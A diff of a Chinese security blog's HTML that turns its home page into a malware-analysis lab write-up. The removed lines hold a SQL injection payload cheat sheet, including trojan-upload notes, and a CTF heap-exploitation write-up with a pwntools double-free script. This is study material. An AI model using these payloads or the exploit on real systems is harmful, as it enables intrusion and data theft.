@@ -79,11 +79,14 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Ivoripuion&#39;s blog">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;index.html">
+<meta name="description" content="Lab6-1Q1：在main函数调用的唯一子过程中发现的主要代码结构是什么？主要是对0x401000处的函数返回值进行一个if判断。 123456789101112131415161718.text:00401040                 push    ebp.text:00401041                 mov     ebp, esp.text:00401043">
+<meta property="og:type" content="article">
+<meta property="og:title" content="恶意代码分析实战 Lab6">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;16&#x2F;lab6&#x2F;index.html">
 <meta property="og:site_name" content="Ivoripuion&#39;s blog">
+<meta property="og:description" content="Lab6-1Q1：在main函数调用的唯一子过程中发现的主要代码结构是什么？主要是对0x401000处的函数返回值进行一个if判断。 123456789101112131415161718.text:00401040                 push    ebp.text:00401041                 mov     ebp, esp.text:00401043">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-04-16T12:23:55.013Z">
 <meta name="twitter:card" content="summary">
 
 
@@ -114,13 +117,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/04/16/lab6/"/>
 
 
 
 
 
-  <title>Ivoripuion's blog</title>
+  <title>恶意代码分析实战 Lab6 | Ivoripuion's blog</title>
   
 
 
@@ -139,8 +142,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -233,9 +235,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -265,9 +267,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/16/lab6/" itemprop="url">恶意代码分析实战 Lab6</a></h1>
+          <h1 class="post-title" itemprop="name headline">恶意代码分析实战 Lab6</h1>
         
 
         <div class="post-meta">
@@ -339,9 +339,7 @@
       
 
       
-        
-          
-            <h1 id="Lab6-1"><a href="#Lab6-1" class="headerlink" title="Lab6-1"></a>Lab6-1</h1><h2 id="Q1：在main函数调用的唯一子过程中发现的主要代码结构是什么？"><a href="#Q1：在main函数调用的唯一子过程中发现的主要代码结构是什么？" class="headerlink" title="Q1：在main函数调用的唯一子过程中发现的主要代码结构是什么？"></a>Q1：在main函数调用的唯一子过程中发现的主要代码结构是什么？</h2><p>主要是对0x401000处的函数返回值进行一个if判断。</p>
+        <h1 id="Lab6-1"><a href="#Lab6-1" class="headerlink" title="Lab6-1"></a>Lab6-1</h1><h2 id="Q1：在main函数调用的唯一子过程中发现的主要代码结构是什么？"><a href="#Q1：在main函数调用的唯一子过程中发现的主要代码结构是什么？" class="headerlink" title="Q1：在main函数调用的唯一子过程中发现的主要代码结构是什么？"></a>Q1：在main函数调用的唯一子过程中发现的主要代码结构是什么？</h2><p>主要是对0x401000处的函数返回值进行一个if判断。</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00401040</span>                 <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401041</span>                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401043</span>                 <span class="keyword">push</span>    <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401044</span>                 <span class="keyword">call</span>    sub_401000</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401049</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_4], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0040104C                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+var_4], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401050</span>                 <span class="keyword">jnz</span>     short loc_401056</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401052</span>                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401054</span>                 <span class="keyword">jmp</span>     short loc_40105B</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401056</span> loc_401056:                             <span class="comment">; CODE XREF: _main+10↑j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401056</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0040105B</span><br><span class="line"><span class="symbol">.text:</span>0040105B loc_40105B:                             <span class="comment">; CODE XREF: _main+14↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0040105B                 <span class="keyword">mov</span>     <span class="built_in">esp</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040105D</span>                 <span class="keyword">pop</span>     <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span>0040105E                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span>0040105E _main           endp</span><br><span class="line"><span class="symbol">.text:</span>0040105E</span><br></pre></td></tr></table></figure>
 
 <p>[ebp+var_4]存储的是0x401000函数的返回值，eax存储main函数得返回值，这里判断0x401000函数的返回值是否为0，是0则main的函数返回0，不是则返回1。</p>
@@ -445,8 +443,6 @@
 <li>“e”:休眠100000ms；</li>
 </ol>
 
-          
-        
       
     </div>
     
@@ -463,177 +459,28 @@
       
 
       
-
-      
-
       
       
-        <div class="post-eof"></div>
+
       
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/16/sqlInjec_note/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ivoripuion">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ivoripuion's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/16/sqlInjec_note/" itemprop="url">SQL Inject</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-16T20:17:18+08:00">
-                2020-04-16
-              </time>
+              <a href="/2020/04/16/sqlInjec_note/" rel="next" title="SQL Inject">
+                <i class="fa fa-chevron-left"></i> SQL Inject
+              </a>
             
+          </div>
 
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
             
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-            <h1 id="有关SQL注入"><a href="#有关SQL注入" class="headerlink" title="有关SQL注入"></a>有关SQL注入</h1><h2 id="查看开发者使用哪种查询"><a href="#查看开发者使用哪种查询" class="headerlink" title="查看开发者使用哪种查询"></a>查看开发者使用哪种查询</h2><ol>
-<li>?id=1’–+</li>
-<li>?id=1–+</li>
-<li>?id=1’)–+</li>
-<li>?id=1”)–+</li>
-<li>?id=1”))-++</li>
-</ol>
-<h2 id="爆库-表-字段"><a href="#爆库-表-字段" class="headerlink" title="爆库,表,字段"></a>爆库,表,字段</h2><h3 id="猜数据库"><a href="#猜数据库" class="headerlink" title="猜数据库"></a>猜数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata</span><br></pre></td></tr></table></figure>
-<h3 id="猜某库的数据表"><a href="#猜某库的数据表" class="headerlink" title="猜某库的数据表"></a>猜某库的数据表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=’xxxxx’</span><br></pre></td></tr></table></figure>
-<h3 id="猜某表的所有列"><a href="#猜某表的所有列" class="headerlink" title="猜某表的所有列"></a>猜某表的所有列</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=’xxxxx’</span><br></pre></td></tr></table></figure>
-<h3 id="获取某列的内容"><a href="#获取某列的内容" class="headerlink" title="获取某列的内容"></a>获取某列的内容</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> *** <span class="keyword">from</span> ****</span><br></pre></td></tr></table></figure>
-<h2 id="基于报错的盲注"><a href="#基于报错的盲注" class="headerlink" title="基于报错的盲注"></a>基于报错的盲注</h2><h4 id="基于xpath语法错误"><a href="#基于xpath语法错误" class="headerlink" title="基于xpath语法错误"></a>基于xpath语法错误</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>)) <span class="comment">--+</span></span><br><span class="line">?<span class="keyword">id</span>=updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">?nid=<span class="number">12</span><span class="string">' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+ </span></span><br><span class="line"><span class="string">//这里的concat的第二个参数就是查询语句</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="导入导出（传马）"><a href="#导入导出（传马）" class="headerlink" title="导入导出（传马）"></a>导入导出（传马）</h3><ol>
-<li><p>查看是否有读写权限</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> mysql.user)&gt;<span class="number">0</span><span class="comment">--+ </span></span><br><span class="line">如果结果返回正常,说明具有读写权限，否则无</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>欲读取文件必须在服务器上，加个木马啥的</p>
-</li>
-<li><p>必须指定文件完整的路径</p>
-</li>
-<li><p>欲读取文件必须小于 max_allowed_packet</p>
-</li>
-</ol>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -643,182 +490,11 @@
   </article>
 
 
-    
-      
 
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/16/noinfowp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ivoripuion">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ivoripuion's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/16/noinfowp/" itemprop="url">noinfoleak</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-16T19:43:37+08:00">
-                2020-04-16
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h1><p>漏洞存在在del这个函数，该函数将保存chunk的地址作为参数free掉：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_4009DE</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">'&gt;'</span>);</span><br><span class="line">  index = readnum_4008A7();</span><br><span class="line">  <span class="keyword">if</span> ( index &gt;= <span class="number">0</span> &amp;&amp; index &lt;= <span class="number">15</span> )</span><br><span class="line">    <span class="built_in">free</span>(arr[<span class="number">2</span> * index]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>free之后没有置NULL，存在UAF漏洞。</p>
-<p>而malloc的chunk最大为(127+1+8)#16=144，控制chunk大小小于128，free掉的chunk就会link进fastbin，此时进行double free就会造成fastbin double free：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_40090A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( index = <span class="number">0</span>; index &lt;= <span class="number">15</span>; ++index )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !arr[<span class="number">2</span> * index] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="string">'&gt;'</span>);</span><br><span class="line">      <span class="built_in">size</span> = readnum_4008A7();</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">size</span> &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">size</span> &lt;= <span class="number">127</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        arr[<span class="number">2</span> * index + <span class="number">1</span>] = <span class="built_in">size</span>;</span><br><span class="line">        arr[<span class="number">2</span> * index] = <span class="built_in">malloc</span>(<span class="built_in">size</span> + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">'&gt;'</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, arr[<span class="number">2</span> * index], <span class="built_in">size</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>arr用来存放malloc的chunk的地址以及对应的大小：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里malloc了三个chunk，可以看到arr分别存储的chunk的地址以及大小</span></span><br><span class="line">gdb-peda$ x/<span class="number">20</span>gx <span class="number">0x6010a0</span></span><br><span class="line"><span class="number">0x6010a0</span>:	<span class="number">0x0000000000602010</span>	<span class="number">0x0000000000000020</span> <span class="comment">//0</span></span><br><span class="line"><span class="number">0x6010b0</span>:	<span class="number">0x0000000000602050</span>	<span class="number">0x0000000000000020</span> <span class="comment">//2</span></span><br><span class="line"><span class="number">0x6010c0</span>:	<span class="number">0x0000000000602080</span>	<span class="number">0x0000000000000020</span> <span class="comment">//2</span></span><br><span class="line"><span class="number">0x6010d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6010e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6010f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x601100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x601110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x601120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x601130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
-
-<p>程序还提供了修改的功能，可以进行一个地址的写操作，结合上面的例子：edit(0,”AAAAAAAA”)修改0x602010 chunk里的数据为”AAAAAAAA”：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">edit_400A28</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">'&gt;'</span>);</span><br><span class="line">  result = readnum_4008A7();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">'&gt;'</span>);</span><br><span class="line">    result = <span class="built_in">read</span>(<span class="number">0</span>, arr[<span class="number">2</span> * v1], arr[<span class="number">2</span> * v1 + <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary_name = <span class="string">'noinfoleak'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	io = process(<span class="string">'./noinfoleak'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">    	<span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc-2.23.so',checksec=False)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io = remote(<span class="string">'ctf1.linkedbyx.com'</span>,<span class="number">10446</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bin = ELF(<span class="string">'./'</span>+binary_name,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">	gdb.attach(io,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">        	raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">	io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"1"</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">"&gt;"</span>,str(size))</span><br><span class="line">	io.sendlineafter(<span class="string">"&gt;"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">	io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">"&gt;"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,data)</span>:</span></span><br><span class="line">	io.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"3"</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">"&gt;"</span>,str(index))</span><br><span class="line">	io.sendafter(<span class="string">"&gt;"</span>,data) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr_addr=<span class="number">0x6010A0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">"/bin/sh\x00"</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"AAAAAAAA"</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"BBBBBBBB"</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(arr_addr))<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"CCCCCCCC"</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"DDDDDDDD"</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"EEEEEEEE"</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">z()</span><br></pre></td></tr></table></figure>
-
-<p>chunk：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">20</span>xg <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000041</span></span><br><span class="line"><span class="number">0x602010</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x000000000000000a</span> <span class="comment">//chunk0</span></span><br><span class="line"><span class="number">0x602020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span> </span><br><span class="line"><span class="number">0x602050</span>:	<span class="number">0x4444444444444444</span>	<span class="number">0x000000000000000a</span> <span class="comment">//chunk1</span></span><br><span class="line"><span class="number">0x602060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x602080</span>:	<span class="number">0x4343434343434343</span>	<span class="number">0x000000000000000a</span> <span class="comment">//chunk2</span></span><br><span class="line"><span class="number">0x602090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
-
-<p>array：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">20</span>xg <span class="number">0x6010a0</span></span><br><span class="line"><span class="number">0x6010a0</span>:	<span class="number">0x0000000000602010</span>	<span class="number">0x0000000000000030</span> <span class="comment">//0</span></span><br><span class="line"><span class="number">0x6010b0</span>:	<span class="number">0x4545454545454545</span>	<span class="number">0x000000000000000a</span> <span class="comment">//1</span></span><br><span class="line"><span class="number">0x6010c0</span>:	<span class="number">0x0000000000602080</span>	<span class="number">0x0000000000000020</span> <span class="comment">//2</span></span><br><span class="line"><span class="number">0x6010d0</span>:	<span class="number">0x0000000000602050</span>	<span class="number">0x0000000000000020</span> <span class="comment">//3</span></span><br><span class="line"><span class="number">0x6010e0</span>:	<span class="number">0x0000000000602080</span>	<span class="number">0x0000000000000020</span> <span class="comment">//4</span></span><br><span class="line"><span class="number">0x6010f0</span>:	<span class="number">0x0000000000602050</span>	<span class="number">0x0000000000000020</span> <span class="comment">//5</span></span><br><span class="line"><span class="number">0x601100</span>:	<span class="number">0x00000000006010b0</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x601110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x601120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span 